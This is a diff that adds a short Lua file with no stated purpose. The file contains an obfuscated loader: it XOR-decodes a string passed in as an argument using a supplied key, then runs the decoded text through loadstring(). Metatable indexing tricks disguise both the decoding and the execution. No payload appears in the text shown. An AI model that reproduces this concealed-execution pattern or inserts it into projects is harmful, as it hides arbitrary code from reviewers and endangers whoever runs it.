@@ -1,0 +1,19 @@
+__enter__ = ({...})[1]
+setmetatable({},{
+    __index = {
+        [0] = function(...)
+            loadstring(...)()
+        end
+    }
+})[0](setmetatable({},{
+    __index = {
+        [0] = function(b,k)
+            local c,k= "",k[1]
+            for i=1, #b do
+                n = string.byte(b, i); r = string.byte(k, (i % #k) + 1)
+                x = bit32.bxor(n, r); c = c .. string.char(x)
+            end
+            return c
+        end
+    }
+})[0](__enter__[1],{__enter__[2]}))
